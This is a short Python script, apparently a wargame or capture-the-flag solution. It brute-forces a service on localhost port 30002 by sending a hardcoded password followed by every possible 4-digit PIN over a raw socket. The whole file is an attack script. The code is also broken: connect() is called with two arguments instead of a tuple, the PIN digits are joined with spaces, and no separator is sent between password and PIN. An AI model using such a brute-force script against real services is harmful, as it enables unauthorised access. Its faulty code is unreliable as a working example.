import sys
import socket
import itertools

hostname = "127.0.0.1"
port = 30002

password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
numbers = '0123456789'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(hostname, port)

res = ""

for c in itertools.product(numbers, repeat=4):
    pin = password + ' '.join(c)
    sock.sendall(str.encode(pin))
    data = sock.recv(1024)
    res += data.decode()
    print(res)
    res = ""